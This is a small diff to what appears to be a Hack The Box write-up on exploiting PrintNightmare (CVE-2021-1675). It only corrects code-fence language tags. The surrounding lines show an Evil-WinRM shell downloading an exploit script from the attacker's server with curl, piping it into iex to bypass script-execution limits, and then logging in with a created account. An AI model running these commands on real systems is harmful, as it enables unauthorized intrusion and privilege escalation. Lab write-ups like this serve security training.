@@ -579,7 +579,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 Then, let's run it through `IEX` without saving file. The target powershell doesn't allow script execution.
 
-```sql
+```powershell
 *Evil-WinRM* PS C:\Users\tony\Documents> curl http://10.10.14.14:8000/CVE-2021-1675.ps1 -UseBasicParsing | iex
 *Evil-WinRM* PS C:\Users\tony\Documents> Get-Command Invoke-Nightmare
 
@@ -597,7 +597,7 @@ Function        Invoke-Nightmare
 
 Then, let's try connecting through `evil-winrm` with created account.
 
-```csharp
+```bash
 ┌──(kali㉿kali)-[~/htb/CVE-2021-1675]
 └─$ evil-winrm -i 10.10.11.106 -u bokchee -p bokchee
 Evil-WinRM shell v3.5
